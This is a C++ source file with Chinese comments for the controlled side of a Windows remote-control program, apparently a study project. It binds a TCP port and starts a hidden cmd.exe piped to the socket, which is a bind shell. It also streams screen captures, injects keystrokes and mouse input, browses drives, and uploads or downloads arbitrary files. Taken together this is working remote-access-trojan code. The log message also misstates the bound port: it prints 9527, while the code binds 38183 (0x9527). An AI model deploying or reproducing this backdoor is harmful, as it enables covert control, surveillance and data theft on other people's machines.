// Controlled.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "Proto.h"
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
using namespace std;
#include <thread>

HANDLE g_hRead;
HANDLE g_hCmdWrite;
HANDLE g_hWrite;
HANDLE g_hCmdRead;
SOCKET g_sock;
void ThreadProc()
{
    while (true)
    {
        Sleep(300);
        DWORD dwBytesAvail = 0;

        if (!PeekNamedPipe(g_hRead, NULL, 0, NULL, &dwBytesAvail, NULL))
        {
            return;
        }
        //如果管道中有数据，则读出
        if (dwBytesAvail > 0)
        {
            char szBuff[MAXWORD] = {};
            DWORD dwBytesRead = 0;
            if (!ReadFile(g_hRead,
                (LPBYTE)szBuff, dwBytesAvail, &dwBytesRead,
                NULL))
            {
                printf("管道读取失败");
            }
            auto pS2CCmdPkg = make_package<S2CCmdPkg>(sizeof(S2CCmdPkg) + dwBytesRead + 1,
                (LPBYTE)szBuff, dwBytesRead + 1);//柔性数组加1，
            SendPack(g_sock, pS2CCmdPkg.get());//auto好像不可以取地址，好像只可以通过get
        }

    }
}



int main()
{
    //创建socket
    SOCKET sockServer = socket(AF_INET, //协议族
        SOCK_STREAM,                    //数据流
        IPPROTO_TCP                     //tcp协议
    );
    if (sockServer == INVALID_SOCKET)
    {
        cout << "socket failed" << endl;
        return 0;
    }
    printf("socket init .... \r\n");

    //绑定端口
    sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(0x9527);
    si.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");

    int nRet = bind(sockServer, (sockaddr*)&si, sizeof(si));
    if (nRet != 0)
    {
        cout << "bind failed" << endl;
        return 0;
    }
    printf("bind port 9527 .... \r\n");

    //监听
    nRet = listen(sockServer, SOMAXCONN);
    if (nRet == SOCKET_ERROR)
    {
        cout << "listen failed" << endl;
        return 0;
    }
    printf("start listening .... \r\n");

    //接受连接
    sockaddr_in siClient = {};
    int nNameLen = sizeof(siClient);
    g_sock = accept(sockServer, (sockaddr*)&siClient, &nNameLen);
    if (g_sock == INVALID_SOCKET)
    {
        cout << "accept failed" << endl;
        return 0;
    }

    printf("ip:%s port:%d connected \r\n",
        inet_ntoa(siClient.sin_addr),
        ntohs(siClient.sin_port));



    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&g_hRead, &g_hCmdWrite, &sa, 0))
    {
        printf("管道创建失败");
    }


    if (!CreatePipe(&g_hCmdRead, &g_hWrite, &sa, 0))
    {
        printf("管道创建失败");
    }

    STARTUPINFO sio;
    PROCESS_INFORMATION pi;

    ZeroMemory(&sio, sizeof(sio));
    sio.cb = sizeof(sio);
    sio.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sio.hStdInput = g_hCmdRead;
    sio.hStdOutput = g_hCmdWrite;
    sio.hStdError = g_hCmdWrite;//如果有错误就直接向管道里写就行了，不用区分是错误还是信息了
    sio.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, // No module name (use command line). 
        (LPSTR)"cmd",        // Command line. 
        NULL,             // Process handle not inheritable. 
        NULL,             // Thread handle not inheritable. 
        TRUE,            // 允许子进程继承父进程的句柄
        0,                // No creation flags. 
        NULL,             // Use parent's environment block. 
        NULL,             // Use parent's starting directory. 
        &sio,              // Pointer to STARTUPINFO structure.
        &pi)             // Pointer to PROCESS_INFORMATION structure.
        )
    {
        printf("CreateProcess failed.");
    }



    bool bFlag = false;
    int nSumSize;//文件的总大小
    int nSize;//已经上传的文件大小
    HANDLE hFile;
    //接收数据
    while (true)
    {
        PackageHeader* pPkg = nullptr;
        int nRet = RecvPack(g_sock, pPkg);
        if (nRet == 0 || nRet == -1)
        {
            printf("connection disconnected or error ... \r\n");
            return 0;
        }


        switch (pPkg->m_pc)
        {
        case C2S_SCREENDATA:
        {
            //获取屏幕DC
            HDC hDcScreen = GetDC(NULL);

            //拷贝屏幕数据
            int nWith = GetSystemMetrics(SM_CXSCREEN);//获取屏幕的宽
            int nHeight = GetSystemMetrics(SM_CYSCREEN);//获取屏幕的高

            HDC hDcMem = CreateCompatibleDC(hDcScreen);//创建兼容DC
            HBITMAP hBmpMem = CreateCompatibleBitmap(hDcScreen, nWith, nHeight);//创建兼容位图
            SelectObject(hDcMem, hBmpMem);//选入位图

            BitBlt(hDcMem, 0, 0, nWith, nHeight,
                hDcScreen, 0, 0,
                SRCCOPY);//拷贝数据、将hDcScreen的数据拷贝到hDcMem

            //获取屏幕数据，用谁呢
            //获取屏幕数据
            int nBytesCnt = GetDeviceCaps(hDcScreen, BITSPIXEL) / 8;//一个像素点所占的字节数
            int nBitsBufSize = nWith * nHeight * nBytesCnt;//屏幕总的内存大小
            shared_ptr<BYTE> ptrBitsBuf(new BYTE[nBitsBufSize]);//申请这么多字节
            GetBitmapBits(hBmpMem, nBitsBufSize, ptrBitsBuf.get());//获取屏幕数据

            //组包，发包
            auto ptrPkg = make_package<S2CScreenDataPkg>(
                sizeof(S2CScreenDataPkg) + nBitsBufSize, //结构体大小 + 柔性数组大小
                nWith, nHeight,
                ptrBitsBuf.get(), nBitsBufSize);

            SendPack(g_sock, ptrPkg.get());

            printf("handl C2S_SCREENDATA end\r\n");
            break;
        }
        case C2S_KEY:
        {
            C2SKeybdPkg* pKeyPkg = (C2SKeybdPkg*)pPkg;
            //响应键盘事件
            keybd_event(pKeyPkg->m_cVk, 0, 0, 0);
            break;
        }
        case C2S_MOUSE:
        {
            C2SMousebdPkg* pMousePkg = (C2SMousebdPkg*)pPkg;
            //设置鼠标的位置
            SetCursorPos(pMousePkg->m_x, pMousePkg->m_y);
            //响应mouse事件
            mouse_event(pMousePkg->m_dwFlags, 0, 0, 0, 0);
            break;
        }
        case C2S_CMD:

        {
            if (!bFlag)
            {
                bFlag = true;
                thread t(ThreadProc);
                t.detach();
                break;
            }
            C2SCmdPkg* pCmdPkg = (C2SCmdPkg*)pPkg;

            DWORD dwBytesWrited = 0;
            if (!WriteFile(g_hWrite, pCmdPkg->m_bufCmdDate, pCmdPkg->m_dwCmdDataLen, &dwBytesWrited, NULL))
            {
                printf("管道写入失败");
            }

            break;
        }
        case C2S_FILE:
        {

            C2SFilePkg* pFliePkg = (C2SFilePkg*)pPkg;
            if (strlen(pFliePkg->m_bufFilePos) == 0)
            {
                char szDrivers[MAXBYTE] = {};
                DWORD dwRet = GetLogicalDriveStrings(sizeof(szDrivers), szDrivers);
                int nIdx1 = 1;
                char strPosition[64];
                for (int i = 0; i < dwRet / 4; i++)
                {
                    char szEmpty[] = "\0";
                    strcpy(strPosition, szDrivers + 4 * i);
                    auto pkgDriver = make_package<S2CFilePkg>(sizeof(S2CFilePkg), (char*)"盘符",
                        (char*)"0", strPosition, szEmpty, 1, i, 2);
                    SendPack(g_sock, pkgDriver.get());
                }
            }
            else
            {
                int nRow = 0;
                int nCol = 0;
                int iIdx = 1;
                CString strSize;
                CFileFind finder;
                CString cstrPosition;
                cstrPosition.Format("%s", pFliePkg->m_bufFilePos);
                cstrPosition += "\\*";
                //m_lstcViewFile.DeleteAllItems();
                BOOL bWorking = finder.FindFile(cstrPosition.GetBuffer());
                //BOOL bWorking = finder.FindFile("C:\\*");
                while (bWorking)
                {
                    nCol = 1;
                    bWorking = finder.FindNextFile();
                    if (finder.IsDirectory())
                    {
                        if (finder.GetFileName().Compare("..") == 0)
                        {
                            strSize.Format("%d KB", finder.GetLength() / 1024);
                            auto pkgDriver = make_package<S2CFilePkg>(sizeof(S2CFilePkg) + finder.GetFileName().GetLength() + 1,
                                (char*)"返回上一层",
                                strSize.GetBuffer(), cstrPosition.GetBuffer(),
                                finder.GetFileName().GetBuffer(), finder.GetFileName().GetLength() + 1, nRow++, 1);
                            SendPack(g_sock, pkgDriver.get());
                        }
                        else
                        {

                            CString strFmt = finder.GetFileName();
                            strSize.Format("%d KB", finder.GetLength() / 1024);
                            auto pkgDriver = make_package<S2CFilePkg>(sizeof(S2CFilePkg) + strFmt.GetLength() + 1, (char*)"文件夹",
                                strSize.GetBuffer(), cstrPosition.GetBuffer(),
                                strFmt.GetBuffer(), strFmt.GetLength() + 1, nRow++, 1);
                            //auto pkgDriver = make_package<S2CFilePkg>(sizeof(S2CFilePkg), (char*)"文件夹",
                            //    strSize.GetBuffer(), cstrPosition.GetBuffer(),
                            //    finder.GetFileName().GetBuffer(), finder.GetFileName().GetLength(), nRow++, 1);
                            SendPack(g_sock, pkgDriver.get());
                        }
                    }
                    else
                    {
                        //获取文件类型  
                        int nLen = finder.GetFileName().GetLength();
                        int nSplitLen = finder.GetFileName().ReverseFind('.');
                        CString strIniPath = finder.GetFileName().Right(nLen - nSplitLen - 1);
                        strIniPath += "类型文件";
                        strSize.Format("%d KB", finder.GetLength() / 1024);
                        auto pkgDriver = make_package<S2CFilePkg>(sizeof(S2CFilePkg) +
                            finder.GetFileName().GetLength() + 1, strIniPath.GetBuffer(),
                            strSize.GetBuffer(), cstrPosition.GetBuffer(),
                            finder.GetFileName().GetBuffer(), finder.GetFileName().GetLength() + 1, nRow++, 0);
                        SendPack(g_sock, pkgDriver.get());
                    }
                }

            }
            break;
        }
        case C2S_FILE_DOWNLOAD:
        {
            C2SFileDownloadPkg* pCmdPkg = (C2SFileDownloadPkg*)pPkg;

            HANDLE hFile;

            hFile = CreateFile(pCmdPkg->m_bufFileDownloadDate,           // open MYFILE.TXT 
                GENERIC_READ,              // open for reading 
                FILE_SHARE_READ,           // share for reading 
                NULL,                      // no security 
                OPEN_EXISTING,             // existing file only 
                FILE_ATTRIBUTE_NORMAL,     // normal file 
                NULL);                     // no attr. template 

            if (hFile == INVALID_HANDLE_VALUE)
            {
                printf("Could not open file.\r\n");   // process error 
                return 0;
            }
            //拿文件大小
            DWORD dwSize = GetFileSize(hFile, NULL);
            //发送文件大小
            auto pkgS2CFileDownloadSize = make_package<S2CFileDownloadPkg>(sizeof(S2CFileDownloadPkg) + 1,
                (LPBYTE)"", 1, 1, dwSize);
            SendPack(g_sock, pkgS2CFileDownloadSize.get());

            char buf[0x1000] = {};

            while (true)
            {
                DWORD dwBytesReaded = 0;
                ReadFile(hFile, buf, sizeof(buf), &dwBytesReaded, NULL);
                if (dwBytesReaded <= 0)
                {
                    CloseHandle(hFile);
                    break;
                }
                auto pkgS2CFileDownload = make_package<S2CFileDownloadPkg>(sizeof(S2CFileDownloadPkg) + dwBytesReaded,
                    (LPBYTE)buf, dwBytesReaded, 2, 0);
                SendPack(g_sock, pkgS2CFileDownload.get());
            }

            break;
        }
        case C2S_FILE_UPLOAD:
        {

            C2SFileUploadPkg* pS2CFilePkg = (C2SFileUploadPkg*)pPkg;
            if (pS2CFilePkg->m_cType == 1)
            {
                nSumSize = pS2CFilePkg->m_nSize;
                nSize = 0;
                hFile = CreateFile(pS2CFilePkg->m_bufFileUploadDate,           // open MYFILE.TXT 
                    GENERIC_WRITE,              // open for reading 
                    FILE_SHARE_READ,           // share for reading 
                    NULL,                      // no security 
                    CREATE_ALWAYS,             // existing file only 
                    FILE_ATTRIBUTE_NORMAL,     // normal file 
                    NULL);                     // no attr. template 

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    printf("Could not open file.\r\n");   // process error 
                    return 0;
                }
            }
            else
            {
                if (nSize < nSumSize)
                {
                    DWORD dwBytesWrited = 0;
                    WriteFile(hFile, pS2CFilePkg->m_bufFileUploadDate,
                        pS2CFilePkg->m_dwFileUploadDataLen, &dwBytesWrited, NULL);//第三个参数表示收多少就写多少。
                    nSize += dwBytesWrited;
                    if (nSize >= nSumSize)
                    {
                        CloseHandle(hFile);
                        printf("文件上传完毕");
                    }
                }
            }
            break;
        }
        default:
            break;
        }
        if (pPkg != nullptr)
        {
            delete (char*)pPkg;
        }

    }


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}



